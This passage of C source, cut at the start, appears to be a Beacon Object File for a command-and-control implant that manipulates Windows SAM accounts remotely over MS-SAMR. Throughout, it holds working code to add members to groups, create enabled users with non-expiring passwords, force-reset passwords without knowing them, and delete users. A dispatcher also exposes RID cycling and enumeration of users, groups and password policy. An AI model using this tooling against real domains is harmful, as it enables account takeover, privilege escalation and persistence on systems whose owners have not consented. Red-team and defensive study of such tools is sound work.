	if ( ! NT_SUCCESS( Status = SAMLIB$SamLookupNamesInDomain( Domain, 1, Groupname, & Rid, & SidType ) ) ) {
		PRINT_NT_ERROR( "SamLookupNamesInDomain", Status );
		goto CLEAN;
	}

	// get a handle onto the sam group
	if ( ! NT_SUCCESS( Status = SAMLIB$SamOpenAlias( Domain, ALIAS_ADD_MEMBER, * Rid, & Group ) ) ) {
		PRINT_NT_ERROR( "SamOpenAlias", Status );
		goto CLEAN;
	}

	// convert the sddl sid to SID structure
	if ( ! ADVAPI32$ConvertStringSidToSidA( NewMemberSidSddl, & NewMemberSid ) ) {
		PRINT_WIN32_ERROR( "ConvertStringSidToSidA" );
		goto CLEAN;
	}

	// add the new member
	if ( ! NT_SUCCESS( Status = SAMLIB$SamAddMemberToAlias( Group, NewMemberSid ) ) ) {
		PRINT_NT_ERROR( "SamAddMemberToAlias", Status );
		goto CLEAN;
	}

	BeaconPrintf(
		CALLBACK_OUTPUT, "Successfully added %s from %ls/%ls", NewMemberSidSddl, DomainName->Buffer, Groupname->Buffer
	);

	CLEAN:
	if ( Server ) NTDLL$NtClose( Server );
	if ( Domain ) NTDLL$NtClose( Domain );
	if ( Group ) NTDLL$NtClose( Group );
	if ( DomainSid ) SAMLIB$SamFreeMemory( DomainSid );
	//if ( NewMemberSid ) KERNEL32$LocalFree( NewMemberSid ); // crash the bof

	return Status;
}

/*!
 * @brief
 * 	remove an object from a group
 *
 * @param ServerName
 * 	MS-SAMR server to connect to
 *
 * @param DomainName
 * 	target domain
 *
 * @param Groupname
 * 	group to remove an object from
 *
 * @param MemberSidSddl
 *	sid in sddl format of the object to remove
 *
 * @return
 * 	ntstatus
 */
NTSTATUS SammyGroupRemoveMember(
	IN OPTIONAL PUNICODE_STRING ServerName,
	IN PUNICODE_STRING DomainName,
	IN PUNICODE_STRING Groupname,
	IN PCHAR MemberSidSddl
) {

	PSID          MemberSid = { 0 };
	NTSTATUS      Status    = { 0 };
	HANDLE        Server    = { 0 };
	HANDLE        Domain    = { 0 };
	HANDLE        Group     = { 0 };
	PSID          DomainSid = { 0 };
	PSID_NAME_USE SidType   = { 0 };
	PULONG        Rid       = { 0 };

	// connect to the sam remote service
	if ( ! NT_SUCCESS( Status = SAMLIB$SamConnect( ServerName, & Server, MAXIMUM_ALLOWED, NULL ) ) ) {
		PRINT_NT_ERROR( "SamConnect", Status );
		return FALSE;
	}

	// get the sid of the domain server
	if ( ! NT_SUCCESS( Status = SAMLIB$SamLookupDomainInSamServer( Server, DomainName, & DomainSid ) ) ) {
		PRINT_NT_ERROR( "SamLookupDomainInSamServer", Status );
		goto CLEAN;
	}

	// get a handle onto the sam domain
	if ( ! NT_SUCCESS( Status = SAMLIB$SamOpenDomain( Server, MAXIMUM_ALLOWED, DomainSid, & Domain ) ) ) {
		PRINT_NT_ERROR( "SamOpenDomain", Status );
		goto CLEAN;
	}

	// lookup the groupname to get the rid and pass it
	if ( ! NT_SUCCESS( Status = SAMLIB$SamLookupNamesInDomain( Domain, 1, Groupname, & Rid, & SidType ) ) ) {
		PRINT_NT_ERROR( "SamLookupNamesInDomain", Status );
		goto CLEAN;
	}

	// get a handle onto the sam group
	if ( ! NT_SUCCESS( Status = SAMLIB$SamOpenAlias( Domain, ALIAS_REMOVE_MEMBER, * Rid, & Group ) ) ) {
		PRINT_NT_ERROR( "SamOpenAlias", Status );
		goto CLEAN;
	}

	// convert the sddl sid to SID structure
	if ( ! ADVAPI32$ConvertStringSidToSidA( MemberSidSddl, & MemberSid ) ) {
		PRINT_WIN32_ERROR( "ConvertStringSidToSidA" );
		goto CLEAN;
	}

	// remove the member
	if ( ! NT_SUCCESS( Status = SAMLIB$SamRemoveMemberFromAlias( Group, MemberSid ) ) ) {
		PRINT_NT_ERROR( "SamRemoveMemberFromAlias", Status );
		goto CLEAN;
	}

	BeaconPrintf(
		CALLBACK_OUTPUT, "Successfully removed %s from %ls/%ls", MemberSidSddl, DomainName->Buffer, Groupname->Buffer
	);

	CLEAN:
	if ( Server ) NTDLL$NtClose( Server );
	if ( Domain ) NTDLL$NtClose( Domain );
	if ( Group ) NTDLL$NtClose( Group );
	if ( DomainSid ) SAMLIB$SamFreeMemory( DomainSid );
	// if ( MemberSid ) KERNEL32$LocalFree( MemberSid ); // crashes the bof

	return Status;
}

/*!
 * @brief
 * 	create a user
 *
 * @param ServerName
 * 	MS-SAMR server to connect to
 *
 * @param DomainName
 * 	target domain
 *
 * @param Username
 * 	username of the user
 *
 * @param Password
 * 	password of the user
 *
 * @return
 * 	ntstatus
 */
NTSTATUS SammyUserCreate(
	IN OPTIONAL PUNICODE_STRING ServerName,
	IN PUNICODE_STRING DomainName,
	IN PUNICODE_STRING Username,
	IN PUNICODE_STRING Password
) {

	NTSTATUS                      Status     = { 0 };
	HANDLE                        Server     = { 0 };
	HANDLE                        Domain     = { 0 };
	HANDLE                        User       = { 0 };
	PSID                          DomainSid  = { 0 };
	ULONG                         Access     = { 0 };
	ULONG                         Rid        = { 0 };
	//UNICODE_STRING                PasswordBlank = { 0 };
	USER_SET_PASSWORD_INFORMATION PasswdInfo = { 0 };

	// connect to the sam remote service
	if ( ! NT_SUCCESS( Status = SAMLIB$SamConnect( ServerName, & Server, MAXIMUM_ALLOWED, NULL ) ) ) {
		PRINT_NT_ERROR( "SamConnect", Status );
		return FALSE;
	}

	// get the sid of the domain server
	if ( ! NT_SUCCESS( Status = SAMLIB$SamLookupDomainInSamServer( Server, DomainName, & DomainSid ) ) ) {
		PRINT_NT_ERROR( "SamLookupDomainInSamServer", Status );
		goto CLEAN;
	}

	// get a handle onto the sam domain
	if ( ! NT_SUCCESS( Status = SAMLIB$SamOpenDomain( Server, DOMAIN_CREATE_USER, DomainSid, & Domain ) ) ) {
		PRINT_NT_ERROR( "SamOpenDomain", Status );
		goto CLEAN;
	}

	/*
	 * create the user
	 * account type:
	 * 	0x10  => NormalAccount (User)
	 * 	0x80  => WorkstationTrustAccount (Workstation)
	 * 	0x100 => ServerTrustAccount (Server)
	 * 	0x40 => InterDomainTrustAccount (InterDomain)
	 *
	 * 	source: NtObjectManager.dll
	 */
	if ( ! NT_SUCCESS( Status = SAMLIB$SamCreateUser2InDomain(
		Domain,
		Username,
		0x10,
		MAXIMUM_ALLOWED,
		& User,
		& Access,
		& Rid
	) ) ) {
		PRINT_NT_ERROR( "SamCreateUser2InDomain", Status );
		goto CLEAN;
	}

	USER_CONTROL_INFORMATION Uac = { 0 };
	Uac.UserAccountControl = USER_NORMAL_ACCOUNT | USER_DONT_EXPIRE_PASSWORD;

	// enable the user
	// https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-samr/99ee9f39-43e8-4bba-ac3a-82e0c0e0699e
	if ( ! NT_SUCCESS( Status = SAMLIB$SamSetInformationUser( User, UserControlInformation, & Uac ) ) ) {
		PRINT_NT_ERROR( "SamSetInformationUser", Status );
		goto CLEAN;
	}

	/*
	 * change the password using UserSetPasswordInformation class
	 * this one is documented nowhere
	 * just James Forshaw used it in its NtObjectManager powershell module
	 * ty James
	 */
	PasswdInfo.Password        = * Password;
	PasswdInfo.PasswordExpired = FALSE;

	if ( ! NT_SUCCESS( Status = SAMLIB$SamSetInformationUser( User, UserSetPasswordInformation, & PasswdInfo ) ) ) {
		PRINT_NT_ERROR( "SamSetInformationUser", Status );
		goto CLEAN;
	}

	BeaconPrintf( CALLBACK_OUTPUT, "Successfully created user %ls\\%ls", DomainName->Buffer, Username->Buffer );

	CLEAN:
	if ( Server ) NTDLL$NtClose( Server );
	if ( Domain ) NTDLL$NtClose( Domain );
	if ( User ) NTDLL$NtClose( User );
	if ( DomainSid ) SAMLIB$SamFreeMemory( DomainSid );

	return Status;
}

/*!
 * @brief
 * 	change the password of a user
 *
 * @param ServerName
 * 	MS-SAMR server to connect to
 *
 * @param DomainName
 * 	target domain
 *
 * @param Username
 * 	user to change the password of
 *
 * @param Password
 * 	current password of the user
 *
 * @param NewPassword
 * 	new password of the user
 *
 * @return
 *	nstatus
 */
NTSTATUS SammyUserChangePassword(
	IN OPTIONAL PUNICODE_STRING ServerName,
	IN PUNICODE_STRING DomainName,
	IN PUNICODE_STRING Username,
	IN PUNICODE_STRING Password,
	IN PUNICODE_STRING NewPassword
) {

	NTSTATUS      Status    = { 0 };
	HANDLE        Domain    = { 0 };
	HANDLE        Server    = { 0 };
	HANDLE        User      = { 0 };
	PSID          DomainSid = { 0 };
	PULONG        Rid       = { 0 };
	PSID_NAME_USE SidType   = { 0 };

	// connect to the sam remote service
	if ( ! NT_SUCCESS( Status = SAMLIB$SamConnect( ServerName, & Server, MAXIMUM_ALLOWED, NULL ) ) ) {
		PRINT_NT_ERROR( "SamConnect", Status );
		return FALSE;
	}

	// get the sid of the domain server
	if ( ! NT_SUCCESS( Status = SAMLIB$SamLookupDomainInSamServer( Server, DomainName, & DomainSid ) ) ) {
		PRINT_NT_ERROR( "SamLookupDomainInSamServer", Status );
		goto CLEAN;
	}

	// get a handle onto the sam domain
	if ( ! NT_SUCCESS( Status = SAMLIB$SamOpenDomain( Server, MAXIMUM_ALLOWED, DomainSid, & Domain ) ) ) {
		PRINT_NT_ERROR( "SamOpenDomain", Status );
		goto CLEAN;
	}

	// lookup the username to get the rid and pass it
	if ( ! NT_SUCCESS( Status = SAMLIB$SamLookupNamesInDomain( Domain, 1, Username, & Rid, & SidType ) ) ) {
		PRINT_NT_ERROR( "SamLookupNamesInDomain", Status );
		goto CLEAN;
	}

	// get a handle onto the sam user
	if ( ! NT_SUCCESS( Status = SAMLIB$SamOpenUser( Domain, USER_CHANGE_PASSWORD, * Rid, & User ) ) ) {
		PRINT_NT_ERROR( "SamOpenUser", Status );
		goto CLEAN;
	}

	// change the password of the user
	if ( ! NT_SUCCESS( Status = SAMLIB$SamChangePasswordUser( User, Password, NewPassword ) ) ) {
		PRINT_NT_ERROR( "SamChangePasswordUser", Status );
		goto CLEAN;
	}

	BeaconPrintf(
		CALLBACK_OUTPUT, "Successfully changed password of user %ls\\%ls", DomainName->Buffer, Username->Buffer
	);

	CLEAN:
	if ( Server ) NTDLL$NtClose( Server );
	if ( Domain ) NTDLL$NtClose( Domain );
	if ( User ) NTDLL$NtClose( User );
	if ( DomainSid ) SAMLIB$SamFreeMemory( DomainSid );

	return Status;
}

/*!
 * @brief
 * 	change the password of a user without knowing it
 *
 * @param ServerName
 *	MS-SAMR server to connect to
 *
 * @param DomainName
 * 	target domain
 *
 * @param Username
 * 	user that will get his password changed
 *
 * @param Password
 * 	new password for the user
 *
 * @return
 * 	ntstatus
 */
NTSTATUS SammyUserForceChangePassword(
	IN OPTIONAL PUNICODE_STRING ServerName,
	IN PUNICODE_STRING DomainName,
	IN PUNICODE_STRING Username,
	IN PUNICODE_STRING Password
) {

	NTSTATUS                      Status     = { 0 };
	HANDLE                        Domain     = { 0 };
	HANDLE                        Server     = { 0 };
	HANDLE                        User       = { 0 };
	PSID                          DomainSid  = { 0 };
	PULONG                        Rid        = { 0 };
	PSID_NAME_USE                 SidType    = { 0 };
	USER_SET_PASSWORD_INFORMATION PasswdInfo = { 0 };

	// connect to the sam remote service
	if ( ! NT_SUCCESS( Status = SAMLIB$SamConnect( ServerName, & Server, MAXIMUM_ALLOWED, NULL ) ) ) {
		PRINT_NT_ERROR( "SamConnect", Status );
		return FALSE;
	}

	// get the sid of the domain server
	if ( ! NT_SUCCESS( Status = SAMLIB$SamLookupDomainInSamServer( Server, DomainName, & DomainSid ) ) ) {
		PRINT_NT_ERROR( "SamLookupDomainInSamServer", Status );
		goto CLEAN;
	}

	// get a handle onto the sam domain
	if ( ! NT_SUCCESS( Status = SAMLIB$SamOpenDomain( Server, MAXIMUM_ALLOWED, DomainSid, & Domain ) ) ) {
		PRINT_NT_ERROR( "SamOpenDomain", Status );
		goto CLEAN;
	}

	// lookup the username to get the rid and pass it
	if ( ! NT_SUCCESS( Status = SAMLIB$SamLookupNamesInDomain( Domain, 1, Username, & Rid, & SidType ) ) ) {
		PRINT_NT_ERROR( "SamLookupNamesInDomain", Status );
		goto CLEAN;
	}

	// get a handle onto the sam user
	if ( ! NT_SUCCESS( Status = SAMLIB$SamOpenUser( Domain, USER_FORCE_PASSWORD_CHANGE, * Rid, & User ) ) ) {
		PRINT_NT_ERROR( "SamOpenUser", Status );
		goto CLEAN;
	}

	/*
	 * change the password using UserSetPasswordInformation class
	 * this one is documented nowhere
	 * just James Forshaw used it in its NtObjectManager powershell module
	 * ty James
	 */
	PasswdInfo.Password        = * Password;
	PasswdInfo.PasswordExpired = FALSE;

	if ( ! NT_SUCCESS( Status = SAMLIB$SamSetInformationUser( User, UserSetPasswordInformation, & PasswdInfo ) ) ) {
		PRINT_NT_ERROR( "SamSetInformationUser", Status );
		goto CLEAN;
	}

	BeaconPrintf(
		CALLBACK_OUTPUT, "Successfully changed password of user %ls\\%ls", DomainName->Buffer, Username->Buffer
	);

	CLEAN:
	if ( Server ) NTDLL$NtClose( Server );
	if ( Domain ) NTDLL$NtClose( Domain );
	if ( User ) NTDLL$NtClose( User );
	if ( DomainSid ) SAMLIB$SamFreeMemory( DomainSid );

	return Status;
}

/*!
 * @brief
 * 	delete a user
 *
 * @param ServerName
 *	MS-SAMR server to connect to
 *
 * @param DomainName
 * 	target domain
 *
 * @param Username
 *	user to delete
 *
 * @return
 * 	ntstatus
 */
NTSTATUS SammyUserDelete(
	IN OPTIONAL PUNICODE_STRING ServerName,
	IN PUNICODE_STRING DomainName,
	IN PUNICODE_STRING Username
) {

	NTSTATUS      Status    = { 0 };
	HANDLE        Server    = { 0 };
	HANDLE        Domain    = { 0 };
	HANDLE        User      = { 0 };
	PSID          DomainSid = { 0 };
	PSID_NAME_USE SidType   = { 0 };
	PULONG        Rid       = { 0 };

	// connect to the sam remote service
	if ( ! NT_SUCCESS( Status = SAMLIB$SamConnect( ServerName, & Server, MAXIMUM_ALLOWED, NULL ) ) ) {
		PRINT_NT_ERROR( "SamConnect", Status );
		return FALSE;
	}

	// get the sid of the domain server
	if ( ! NT_SUCCESS( Status = SAMLIB$SamLookupDomainInSamServer( Server, DomainName, & DomainSid ) ) ) {
		PRINT_NT_ERROR( "SamLookupDomainInSamServer", Status );
		goto CLEAN;
	}

	// get a handle onto the sam domain
	if ( ! NT_SUCCESS( Status = SAMLIB$SamOpenDomain( Server, MAXIMUM_ALLOWED, DomainSid, & Domain ) ) ) {
		PRINT_NT_ERROR( "SamOpenDomain", Status );
		goto CLEAN;
	}

	// lookup the username to get the rid and pass it
	if ( ! NT_SUCCESS( Status = SAMLIB$SamLookupNamesInDomain( Domain, 1, Username, & Rid, & SidType ) ) ) {
		PRINT_NT_ERROR( "SamLookupNamesInDomain", Status );
		goto CLEAN;
	}

	// get a handle onto the sam user
	if ( ! NT_SUCCESS( Status = SAMLIB$SamOpenUser( Domain, MAXIMUM_ALLOWED, * Rid, & User ) ) ) {
		PRINT_NT_ERROR( "SamOpenUser", Status );
		goto CLEAN;
	}

	// delete the sam user
	if ( ! NT_SUCCESS( Status = SAMLIB$SamDeleteUser( User ) ) ) {
		PRINT_NT_ERROR( "SamDeleteUser", Status );
		goto CLEAN;
	}

	BeaconPrintf(
		CALLBACK_OUTPUT, "Successfully removed user %ls\\%ls", DomainName->Buffer, Username->Buffer
	);

	CLEAN:
	if ( Server ) NTDLL$NtClose( Server );
	if ( Domain ) NTDLL$NtClose( Domain );
	if ( User ) NTDLL$NtClose( User );
	if ( DomainSid )SAMLIB$SamFreeMemory( DomainSid );

	return Status;
}

VOID go(
	_In_ PCHAR args,
	_In_ INT argc
) {

	datap          Parser     = { 0 };
	PSTR           Command    = { 0 };
	PSTR           Arg0       = { 0 };
	PSTR           Arg1       = { 0 };
	PSTR           Arg2       = { 0 };
	PSTR           Arg3       = { 0 };
	PSTR           Arg4       = { 0 };
	INT            Num1       = { 0 };
	INT            Num2       = { 0 };
	INT            CommandLen = { 0 };
	INT            Arg0Len    = { 0 };
	INT            Arg1Len    = { 0 };
	INT            Arg2Len    = { 0 };
	INT            Arg3Len    = { 0 };
	INT            Arg4Len    = { 0 };
	UNICODE_STRING Server     = { 0 };
	UNICODE_STRING Domain     = { 0 };
	UNICODE_STRING Name1      = { 0 };
	UNICODE_STRING Name2      = { 0 };
	UNICODE_STRING Name3      = { 0 };
	BOOL Success              = { 0 };

	/* Initialize the argument buffer for parsing */
	BeaconDataParse( & Parser, args, argc );

	/* Extract arguments */
	Command = BeaconDataExtract( & Parser, & CommandLen );

	if ( StrCmp( Command, "list-domains" ) ) {
		// get the first arg
		Arg0 = BeaconDataExtract( & Parser, & Arg0Len );

		// check args were supplied
		if ( ! Arg0 ) {
			BeaconPrintf( CALLBACK_ERROR, "Invalid arguments" );
			goto END;
		}

		// convert the server to unicode string
		CharStringToUnicodeString( Arg0, Arg0Len, & Server );

		// list the domains
		SammyDomainsList( & Server );
	} else if ( StrCmp( Command, "list-account-rights" ) ) {

		// get the args
		Arg0 = BeaconDataExtract( & Parser, & Arg0Len );
		Arg1 = BeaconDataExtract( & Parser, & Arg1Len );
		Arg2 = BeaconDataExtract( & Parser, & Arg2Len );

		// check args were supplied
		if ( ! Arg0 || ! Arg1 || ! Arg2 ) {
			BeaconPrintf( CALLBACK_ERROR, "Invalid arguments" );
			goto END;
		}

		// convert the args to unicode string
		CharStringToUnicodeString( Arg0, Arg0Len, & Server );
		CharStringToUnicodeString( Arg1, Arg1Len, & Domain );
		CharStringToUnicodeString( Arg2, Arg2Len, & Name1 );

		// list account rights
		SammyUserEnumAccountRights( & Server, & Domain, & Name1 );
	} else if ( ( Success = StrCmp( Command, "add-account-right" ) ) || StrCmp( Command, "remove-account-right" ) ) {

		// get the args
		Arg0 = BeaconDataExtract( & Parser, & Arg0Len );
		Arg1 = BeaconDataExtract( & Parser, & Arg1Len );
		Arg2 = BeaconDataExtract( & Parser, & Arg2Len );
		Arg3 = BeaconDataExtract( & Parser, & Arg3Len );

		// check args were supplied
		if ( ! Arg0 || ! Arg1 || ! Arg2 || ! Arg3 ) {
			BeaconPrintf( CALLBACK_ERROR, "Invalid arguments" );
			goto END;
		}

		// convert the args to unicode string
		CharStringToUnicodeString( Arg0, Arg0Len, & Server );
		CharStringToUnicodeString( Arg1, Arg1Len, & Domain );
		CharStringToUnicodeString( Arg2, Arg2Len, & Name1 );
		CharStringToUnicodeString( Arg3, Arg3Len, & Name2 );

		// change account rights
		SammyUserChangeAccountRights( & Server, & Domain, & Name1, & Name2, Success );
	} else if ( StrCmp( Command, "rid-cycling" ) ) {

		// get the args
		Arg0 = BeaconDataExtract( & Parser, & Arg0Len );
		Arg1 = BeaconDataExtract( & Parser, & Arg1Len );
		Num1 = BeaconDataInt( & Parser );
		Num2 = BeaconDataInt( & Parser );

		// check args were supplied
		if ( ! Arg0 || ! Arg1 ) {
			BeaconPrintf( CALLBACK_ERROR, "Invalid arguments" );
			goto END;
		}

		// convert the args to unicode string
		CharStringToUnicodeString( Arg0, Arg0Len, & Server );
		CharStringToUnicodeString( Arg1, Arg1Len, & Domain );

		// perform rid cycling
		SammyRidCycling( & Server, & Domain, Num1, Num2 );
	} else if ( StrCmp( Command, "enum-password-policy" ) ) {

		// get the args
		Arg0 = BeaconDataExtract( & Parser, & Arg0Len );
		Arg1 = BeaconDataExtract( & Parser, & Arg1Len );

		// check args were supplied
		if ( ! Arg0 || ! Arg1 ) {
			BeaconPrintf( CALLBACK_ERROR, "Invalid arguments" );
			goto END;
		}

		// convert the args to unicode string
		CharStringToUnicodeString( Arg0, Arg0Len, & Server );
		CharStringToUnicodeString( Arg1, Arg1Len, & Domain );

		// enum the password policy
		SammyDomainGetPasswordPolicy( & Server, & Domain );
	} else if ( ( Success = StrCmp( Command, "list-users" ) ) || StrCmp( Command, "list-groups" ) ) {

		// get the args
		Arg0 = BeaconDataExtract( & Parser, & Arg0Len );
		Arg1 = BeaconDataExtract( & Parser, & Arg1Len );

		// check args were supplied
		if ( ! Arg0 || ! Arg1 ) {
			BeaconPrintf( CALLBACK_ERROR, "Invalid arguments" );
			goto END;
		}

		// convert the args to unicode string
		CharStringToUnicodeString( Arg0, Arg0Len, & Server );
		CharStringToUnicodeString( Arg1, Arg1Len, & Domain );

		// list objects
		SammyObjectsList( & Server, & Domain, Success ? SAMMY_USER : SAMMY_GROUP );
	} else if ( StrCmp( Command, "list-group-members" ) ) {

		// get the args
		Arg0 = BeaconDataExtract( & Parser, & Arg0Len );
		Arg1 = BeaconDataExtract( & Parser, & Arg1Len );
		Arg2 = BeaconDataExtract( & Parser, & Arg2Len );

		// check args were supplied
		if ( ! Arg0 || ! Arg1 || ! Arg2 ) {
			BeaconPrintf( CALLBACK_ERROR, "Invalid arguments" );
			goto END;
		}

		// convert the args to unicode string
		CharStringToUnicodeString( Arg0, Arg0Len, & Server );
		CharStringToUnicodeString( Arg1, Arg1Len, & Domain );
		CharStringToUnicodeString( Arg2, Arg2Len, & Name1 );

		// enum users of the group
		SammyGroupListMembers( & Server, & Domain, & Name1 );
	} else if ( StrCmp( Command, "remove-group" ) ) {

		// get the args
		Arg0 = BeaconDataExtract( & Parser, & Arg0Len );
		Arg1 = BeaconDataExtract( & Parser, & Arg1Len );
		Arg2 = BeaconDataExtract( & Parser, & Arg2Len );

		// check args were supplied
		if ( ! Arg0 || ! Arg1 || ! Arg2 ) {
			BeaconPrintf( CALLBACK_ERROR, "Invalid arguments" );
			goto END;
		}

		// convert the args to unicode string
		CharStringToUnicodeString( Arg0, Arg0Len, & Server );
		CharStringToUnicodeString( Arg1, Arg1Len, & Domain );
		CharStringToUnicodeString( Arg2, Arg2Len, & Name1 );

		// delete the group
		SammyGroupDelete( & Server, & Domain, & Name1 );
	} else if ( StrCmp( Command, "create-group" ) ) {

		// get the args
		Arg0 = BeaconDataExtract( & Parser, & Arg0Len );
		Arg1 = BeaconDataExtract( & Parser, & Arg1Len );
		Arg2 = BeaconDataExtract( & Parser, & Arg2Len );

		// check args were supplied
		if ( ! Arg0 || ! Arg1 || ! Arg2 ) {
			BeaconPrintf( CALLBACK_ERROR, "Invalid arguments" );
			goto END;
		}

		// convert the args to unicode string
		CharStringToUnicodeString( Arg0, Arg0Len, & Server );
		CharStringToUnicodeString( Arg1, Arg1Len, & Domain );
		CharStringToUnicodeString( Arg2, Arg2Len, & Name1 );

		// create the group
		SammyGroupCreate( & Server, & Domain, & Name1 );
	} else if ( StrCmp( Command, "remove-group-member" ) ) {

		// get the args
		Arg0 = BeaconDataExtract( & Parser, & Arg0Len );
		Arg1 = BeaconDataExtract( & Parser, & Arg1Len );
		Arg2 = BeaconDataExtract( & Parser, & Arg2Len );
		Arg3 = BeaconDataExtract( & Parser, & Arg3Len );

		// check args were supplied
		if ( ! Arg0 || ! Arg1 || ! Arg2 || ! Arg3 ) {
			BeaconPrintf( CALLBACK_ERROR, "Invalid arguments" );
			goto END;
		}

		// convert the args to unicode string
		CharStringToUnicodeString( Arg0, Arg0Len, & Server );
		CharStringToUnicodeString( Arg1, Arg1Len, & Domain );
		CharStringToUnicodeString( Arg2, Arg2Len, & Name1 );

		// remove user from the group
		SammyGroupRemoveMember( & Server, & Domain, & Name1, Arg3 );
	} else if ( StrCmp( Command, "add-group-member" ) ) {

		// get the args
		Arg0 = BeaconDataExtract( & Parser, & Arg0Len );
		Arg1 = BeaconDataExtract( & Parser, & Arg1Len );
		Arg2 = BeaconDataExtract( & Parser, & Arg2Len );
		Arg3 = BeaconDataExtract( & Parser, & Arg3Len );

		// check args were supplied
		if ( ! Arg0 || ! Arg1 || ! Arg2 || ! Arg3 ) {
			BeaconPrintf( CALLBACK_ERROR, "Invalid arguments" );
			goto END;
		}

		// convert the args to unicode string
		CharStringToUnicodeString( Arg0, Arg0Len, & Server );
		CharStringToUnicodeString( Arg1, Arg1Len, & Domain );
		CharStringToUnicodeString( Arg2, Arg2Len, & Name1 );
		CharStringToUnicodeString( Arg3, Arg3Len, & Name2 );

		// add a user to a group
		SammyGroupAddMember( & Server, & Domain, & Name1, Arg3 );
	} else if ( StrCmp( Command, "create-user" ) ) {

		// get the args
		Arg0 = BeaconDataExtract( & Parser, & Arg0Len );
		Arg1 = BeaconDataExtract( & Parser, & Arg1Len );
		Arg2 = BeaconDataExtract( & Parser, & Arg2Len );
		Arg3 = BeaconDataExtract( & Parser, & Arg3Len );

		// check args were supplied
		if ( ! Arg0 || ! Arg1 || ! Arg2 || ! Arg3 ) {
			BeaconPrintf( CALLBACK_ERROR, "Invalid arguments" );
			goto END;
		}

		// convert the args to unicode string
		CharStringToUnicodeString( Arg0, Arg0Len, & Server );
		CharStringToUnicodeString( Arg1, Arg1Len, & Domain );
		CharStringToUnicodeString( Arg2, Arg2Len, & Name1 );
		CharStringToUnicodeString( Arg3, Arg3Len, & Name2 );

		// enum users of the group
		SammyUserCreate( & Server, & Domain, & Name1, & Name2 );
	} else if ( StrCmp( Command, "change-password" ) ) {

		// get the args
		Arg0 = BeaconDataExtract( & Parser, & Arg0Len );
		Arg1 = BeaconDataExtract( & Parser, & Arg1Len );
		Arg2 = BeaconDataExtract( & Parser, & Arg2Len );
		Arg3 = BeaconDataExtract( & Parser, & Arg3Len );
		Arg4 = BeaconDataExtract( & Parser, & Arg4Len );

		// check args were supplied
		if ( ! Arg0 || ! Arg1 || ! Arg2 || ! Arg3 || ! Arg4 ) {
			BeaconPrintf( CALLBACK_ERROR, "Invalid arguments" );
			goto END;
		}

		// convert the args to unicode string
		CharStringToUnicodeString( Arg0, Arg0Len, & Server );
		CharStringToUnicodeString( Arg1, Arg1Len, & Domain );
		CharStringToUnicodeString( Arg2, Arg2Len, & Name1 );
		CharStringToUnicodeString( Arg3, Arg3Len, & Name2 );
		CharStringToUnicodeString( Arg4, Arg4Len, & Name3 );

		// enum users of the group
		SammyUserChangePassword( & Server, & Domain, & Name1, & Name2, & Name3 );
	} else if ( StrCmp( Command, "force-change-password" ) ) {

		// get the args
		Arg0 = BeaconDataExtract( & Parser, & Arg0Len );
		Arg1 = BeaconDataExtract( & Parser, & Arg1Len );
		Arg2 = BeaconDataExtract( & Parser, & Arg2Len );
		Arg3 = BeaconDataExtract( & Parser, & Arg3Len );

		// check args were supplied
		if ( ! Arg0 || ! Arg1 || ! Arg2 || ! Arg3 ) {
			BeaconPrintf( CALLBACK_ERROR, "Invalid arguments" );
			goto END;
		}

		// convert the args to unicode string
		CharStringToUnicodeString( Arg0, Arg0Len, & Server );
		CharStringToUnicodeString( Arg1, Arg1Len, & Domain );
		CharStringToUnicodeString( Arg2, Arg2Len, & Name1 );
		CharStringToUnicodeString( Arg3, Arg3Len, & Name2 );

		// enum users of the group
		SammyUserForceChangePassword( & Server, & Domain, & Name1, & Name2 );
	} else if ( StrCmp( Command, "remove-user" ) ) {
		// get the args
		Arg0 = BeaconDataExtract( & Parser, & Arg0Len );
		Arg1 = BeaconDataExtract( & Parser, & Arg1Len );
		Arg2 = BeaconDataExtract( & Parser, & Arg2Len );

		// check args were supplied
		if ( ! Arg0 || ! Arg1 || ! Arg2 ) {
			BeaconPrintf( CALLBACK_ERROR, "Invalid arguments" );
			goto END;
		}

		// convert the args to unicode string
		CharStringToUnicodeString( Arg0, Arg0Len, & Server );
		CharStringToUnicodeString( Arg1, Arg1Len, & Domain );
		CharStringToUnicodeString( Arg2, Arg2Len, & Name1 );

		// delete the user
		SammyUserDelete( & Server, & Domain, & Name1 );
	} else {
		BeaconPrintf( CALLBACK_ERROR, "Invalid command!" );
	}
  
END:
	if ( Server.Buffer ) NTDLL$RtlFreeHeap( NtCurrentPeb()->ProcessHeap, 0, Server.Buffer );
	if ( Domain.Buffer ) NTDLL$RtlFreeHeap( NtCurrentPeb()->ProcessHeap, 0, Domain.Buffer );
	if ( Name1.Buffer ) NTDLL$RtlFreeHeap( NtCurrentPeb()->ProcessHeap, 0, Name1.Buffer );
	if ( Name2.Buffer ) NTDLL$RtlFreeHeap( NtCurrentPeb()->ProcessHeap, 0, Name2.Buffer );
	if ( Name3.Buffer ) NTDLL$RtlFreeHeap( NtCurrentPeb()->ProcessHeap, 0, Name3.Buffer );
}